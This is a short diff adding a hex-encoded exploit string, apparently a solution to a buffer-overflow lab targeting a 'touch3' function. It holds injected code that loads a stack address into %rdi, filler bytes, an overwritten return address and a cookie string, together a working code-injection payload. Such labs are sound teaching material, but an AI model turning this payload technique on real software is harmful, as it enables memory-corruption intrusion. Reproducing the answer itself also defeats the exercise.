@@ -1,0 +1,8 @@
+48 c7 c7 a0 fb 63 55 /* mov $0x5563fba0, %rdi */
+c3 /* retq */
+09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 /* filler */
+78 fb 63 55 00 00 00 00 /* return bottom of stack  */
+b9 19 40 00 00 00 00 00 /* return touch3 */
+31 63 30 30 39 36 65 31 /* str cookie */
+
+
